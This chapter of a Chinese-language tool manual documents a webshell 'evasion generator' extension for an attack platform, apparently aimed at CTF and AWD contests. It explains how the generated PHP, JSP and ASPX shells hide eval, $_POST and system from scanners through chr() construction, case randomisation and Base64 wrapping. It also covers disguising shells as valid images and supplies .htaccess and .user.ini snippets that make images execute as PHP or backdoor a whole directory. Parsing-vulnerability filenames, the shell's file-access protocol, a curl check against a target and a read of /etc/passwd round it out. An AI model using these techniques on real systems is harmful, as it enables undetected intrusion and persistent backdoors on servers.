# 19 木马免杀生成器（扩展）

**入口**：左侧菜单「攻击」→「木马生成」→ `/attack/trojan` → 顶部按钮 **🛡 免杀生成器**

官方木马页只提供 4 类型 × 3 语言 = 12 个**固定模板**，代码里是明文 `eval($_POST['pass'])`，任何一款查杀工具（D盾、河马、安全狗、CloudWalker）都能一眼命中。本扩展在**不改动官方二进制**的前提下，用前端注入的方式加了一个独立的免杀生成面板：

- **三档免杀**：从「能用」到「静态扫描看不到关键字」
- **图片马 / 图标伪装**：木马前面拼真实的图片文件头，`getimagesize()` / `exif_imagetype()` 都判定为合法图片
- **一键配套文件**：自动生成 `.htaccess`、`.user.ini`，让伪装成 `.jpg` 的木马也能被解析执行

> ⚠️ 仅可用于授权靶场 / CTF / AWD。把木马写到未授权系统属于违法犯罪。

> 📌 **v2 已发布**：如果你要的是「流量侧也看不出来」而不只是「静态扫描过」，看 [22 章 木马生成器 v2](22-trojan-godzilla.md)。v2 在本文基础上加了加密信道（XOR/AES）、五种真实图片马、md5 标记定位、一键连接脚本与自检脚本。本章的一代产物仍然可用，但请求体是明文 Base64。

---

## 1. 打开面板

1. 打开 `/attack/trojan`
2. 「下载木马」按钮右侧会出现 **🛡 免杀生成器**（扩展每 2 秒检查一次，SPA 路由切换后会自动补挂）
3. 点击打开全屏面板

如果按钮没出现：

```js
// 浏览器控制台
window.__lpTrojanPlus        // 应为 true
window.__lpTrojanPlusOpen()  // 手动打开
```

没加载说明缓存旧了，`Cmd + Shift + R` 强刷一次。

---

## 2. 面板结构

```
[编程语言] [功能] [免杀等级] [参数名] [🎲]  [伪装] [文件名] [生成]
┌──────────────────────────┬──────────────────┐
│  代码（可编辑）            │  说明 / 用法       │
└──────────────────────────┴──────────────────┘
195 字节 · 参数名 pass                       ← 实时信息栏
[下载木马] [复制代码] [复制整文件 Base64] [.htaccess] [.user.ini]
```

任何选项变动都会**立即重新生成**，右侧信息栏实时显示最终字节数、图片头大小、参数名。

### 2.1 编程语言

| 值 | 目标 |
|---|---|
| `PHP` | AWD Web 题主力，默认 |
| `JSP` | Tomcat / Java Web |
| `ASPX` | IIS / .NET |

### 2.2 功能（4 种）

| 值 | 能力 | 说明 |
|---|---|---|
| `eval` | 代码执行 | 传 PHP 代码，最强，配合「文件管理」插件可当完整 Shell |
| `cmd` | 命令执行 | 直接 `system()` / `Runtime.exec` / `Process` |
| `dual` | 代码 + 命令 | 一个文件两种用法：`?a=c&c=whoami` 走命令，否则走代码执行 |
| `file` | 文件管理 | 列目录 / 读 / 写 / 删，纯 Base64 传输，二进制安全 |

`file` 型的参数协议（PHP / JSP / ASPX 一致）：

| 请求 | 作用 |
|---|---|
| `?a=l&p=/var/www` | 列目录 |
| `?a=r&p=/flag` | 读文件，返回 Base64 |
| `?a=w&p=/var/www/x.php&d=<base64>` | 写文件 |
| `?a=x&p=/tmp/a` | 删除 |

### 2.3 免杀等级（3 档）

| 等级 | 手段 | 能过什么 | 体积 |
|---|---|---|---|
| **L1 基础** | 函数名字面量拆分 `'eV'.'al'` + 随机大小写 | 大小写敏感的特征串（`eval(`、`system(`） | 最小 |
| **L2 进阶** | `chr()` 构造函数名 + `$GLOBALS['_'.'POST']` 替代 `$_POST` + 随机变量名 + 诱饵注释 | 关键字扫描（`eval`、`$_POST`、`system` 全都不出现） | 中 |
| **L3 极限** | 整个核心体 Base64，外层只剩 `strrev` 诱饵 + chr 构造的 `base64_decode` | 静态特征扫描、代码相似度比对 | 最大 |

**关于 `eval` 的硬限制（重要）**：`eval` 在 PHP 里是**语言结构，不是函数**，无法像 `system` 那样用 `$f = 'ev'.'al'; $f($code)` 间接调用（会报 `Call to undefined function`）。所以 L2/L3 的做法是：

- `eval` 关键字本身保留，但**随机大小写**（`EvAl` / `EVAL` / `evAl`）并在关键字和括号之间插入随机空白或注释（`@EvAl  ($v)`），大小写敏感的特征串会漏
- **真正藏起来的是业务特征**：参数名、`$_POST`、`$GLOBALS`、`system`、`file_get_contents`、`base64_decode` 全部由 `chr()` 数组在运行时拼出来，源码里一个都搜不到

实测 L2/L3 的 PHP 文件里 grep 不到 `eval(`、`system(`、`$_POST`、`$_REQUEST`、`base64_decode(` 任何一种明文组合。

### 2.4 参数名

默认 `pass`，点 🎲 随机生成 5 位字母。也可以手填（必须是合法 PHP 标识符 `[A-Za-z_][A-Za-z0-9_]*`，非法会被自动纠正）。

L2/L3 下参数名同样被隐藏：JSP/ASPX 用 Base64 解出来，PHP 用 `$GLOBALS['_'.'POST']` + chr 拼接。

---

## 3. 图片马 / 图标伪装

### 3.1 用法

在「伪装」下拉里选一种图片格式，生成的木马会在 `<?php` **前面**拼上该格式的真实文件头：

| 伪装 | 文件头 | 大小 | 用途 |
|---|---|---|---|
| `GIF` | `GIF89a` | 43 B | 最小，最通用，头像/表情包 |
| `PNG` | `\x89PNG` | 70 B | 头像上传点最常见 |
| `JPG` | `\xFF\xD8\xFF\xE0` | 631 B | 照片上传点、`exif_imagetype()` 严格校验 |
| `ICO` | `\x00\x00\x01\x00` | 92 B | favicon 上传点 |
| `BMP` | `BM` | 58 B | 少见，能过只放行 bmp 的白名单 |
| `自定义` | 你的原图 | 原图大小 | 上传真实图片/图标，字节级原样前置 |

文件名会自动变成 `logo.php` / `avatar.php` / `photo.php` / `favicon.php` / `banner.php` / `upload.php`，也可手改。

**「自定义」怎么用**：选「自定义图片 / 图标…」会自动弹出文件选择框，选一张你本地的图片（`.png/.jpg/.ico/.gif/.bmp` 都行），面板会显示缩略图和实际字节数。生成的木马 = 你的整张图片 + `<?php ... ?>`，所以：

- `file` 命令看到的是真图片
- 浏览器打开是图（图片正常渲染，后面代码不显示）
- `getimagesize()` / `exif_imagetype()` 返回合法图片类型

实测五种内置头 + 自定义图片，PHP 8.5 下 `getimagesize()` 全部返回正确尺寸与 MIME，`exif_imagetype()` 返回 1/2/3/6/17，同时 `include` 后木马功能正常执行。

### 3.2 让伪装文件被解析

图片马的后缀通常是 `.jpg` / `.png`，Web 服务器默认不会当 PHP 跑。三种办法：

**A. 直接传 `.php` 后缀**（最简单）
很多上传点只校验内容不校验后缀，或者允许 `.php`。图片头是为了过内容检测，不是为了改后缀。

**B. 传 `.htaccess`**（Apache + mod_php）
面板底部点 **.htaccess** 下载，和木马放同一目录：

```apache
AddType application/x-httpd-php .php .jpg .png .gif .ico .bmp
AddHandler application/x-httpd-php .php .jpg .png .gif .ico .bmp
Options -Indexes
```

之后 `logo.jpg` 就会被当 PHP 执行。

**C. 传 `.user.ini`**（PHP-FPM / Nginx + fastcgi）
面板底部点 **.user.ini** 下载：

```ini
auto_prepend_file=shell.php
```

同目录下**任何** PHP 文件被访问时都会先包含 `shell.php`，等于无条件后门。注意 `.user.ini` 有 `user_ini.cache_ttl`（默认 300 秒）延迟。

**D. 解析漏洞**（不用配置文件）
Apache 多后缀 `logo.php.jpg`、Nginx `logo.jpg/.php`、IIS 分号 `logo.asp;.jpg`——取决于目标中间件版本，先探测再决定。

### 3.3 注意

- **只有 PHP 适合图片马**。JSP/ASPX 的容器（Tomcat/IIS）在 `<%@` 之前出现二进制会直接 500，所以选非 PHP 语言时面板会提示 ⚠
- 图片头是**原样 echo 输出**的，所以图片马执行时响应体前面会带一段二进制。用 `curl` 看会觉得"乱码 + 结果"，正常
- 别用超大图（> 1 MB），有些上传点有大小限制，而且没必要

---

## 4. 典型流程（AWD）

```
1. 找到上传点 / 任意文件写入
2. 免杀生成器：PHP + file 功能 + L2 + 伪装 JPG + 参数名随机
3. 下载木马 → 上传（改后缀为 .php，或配合 .htaccess）
4. 浏览器/curl 验证：
   curl 'http://target/upload/photo.php?pass=xxx&a=l&p=/'
5. 拿到目录列表后，用平台的「WebShell 文件管理器」接管（见 09 章）
6. 找 flag → 用「Flag 查找」扩展批量扫（见 18 章）
```

### 4.1 验证清单

| 检查 | 方法 |
|---|---|
| 是否落地 | `?a=l&p=.` 能列目录 |
| 是否被查杀 | 传到本地 `D盾` / `河马` 扫一遍（AWD 常见对手工具） |
| 是否真图片 | `file photo.php`、`identify photo.php` 能识别 |
| 权限 | `?a=r&p=/etc/passwd` 能不能读 |

---

## 5. 常见问题

**Q：面板里代码看起来不像木马，是不是生成错了？**
L2/L3 本来就是这样——`chr()` 数组和 Base64 肉眼不可读。点「复制整文件 Base64」可以看原始字节。

**Q：L3 的 `Eval` 大小写混合，PHP 认吗？**
认。PHP 关键字**大小写不敏感**，`EVAL()`、`EvAl()`、`eVal()` 都能跑。这正是绕过大小写敏感特征串的原理。

**Q：能不能完全去掉 `eval` 这个词？**
PHP 8 下不行。`assert()` 从 PHP 8.0 起不再对字符串求值，`create_function` 在 PHP 8 已移除，`preg_replace` 的 `/e` 在 PHP 7 已移除，`eval` 又不是函数不能被 `$f()` 间接调用。所以 `eval` 必须出现，我们只做到「随机大小写 + 前后插注释/空白」+ 把其它所有特征藏起来。真正的免杀靠的是**图片头 + 参数名隐藏 + 函数名 chr 构造**这三层。

**Q：为什么下载的 `.php` 用记事本打开是乱码？**
图片马前面是二进制图片头，正常。用十六进制编辑器或 `file` 命令看。

**Q：JSP/ASPX 能加图片头吗？**
不建议，容器会解析失败。面板会提示。

**Q：改了 `trojanplus.js` 没生效？**
前端静态文件没有 hash，必须手动 bump：改 `assets_v2/lp-ext/trojanplus.js` 后同时改 `boot.js` 里的 `trojanplus.js?v=N` 和 `index.html` 里的 `boot.js?v=M`，再 `Cmd + Shift + R`。

---

## 6. 调试出口

```js
window.__lpTrojanPlus          // 扩展是否加载
window.__lpTrojanPlusOpen()    // 打开面板
window.__lpTrojanPlusState     // 当前状态 {lang,kind,level,mask,custom,customName,code,bytes,name}
window.__lpTrojanPlusGen       // {php, jsp, aspx, maskBytes, htaccess, userini} 直接生成
```

批量生成 / 自测：

```js
const g = window.__lpTrojanPlusGen;
for (const kind of ['eval','cmd','dual','file'])
  for (const lv of [1,2,3])
    console.log(kind, lv, g.php(kind, lv, 'pass').length);
```

---

## 7. 官方模板 vs 本扩展

| 维度 | 官方（`/attack/trojan`） | 本扩展（🛡 免杀生成器） |
|---|---|---|
| 模板数 | 12 个固定 | 3 语言 × 4 功能 × 3 等级 = 36 种组合，代码每次随机 |
| 关键字 | 明文 `eval($_POST['pass'])` | L2/L3 无明文关键字 |
| 变量名 | 固定 | 每次随机 |
| 参数名 | 固定 `pass` | 随机 / 自定义，L2+ 隐藏 |
| 图片马 | 无 | 5 种内置 + 自定义原图 |
| 配套文件 | 无 | `.htaccess` / `.user.ini` 一键生成 |
| 二进制传输 | 无 | `file` 功能全程 Base64 |
| 下载 | Blob | Blob（图片头 + 代码） |

官方模板依然可用，两者并存互不影响——本扩展只是在「下载木马」旁边多加了一个按钮。
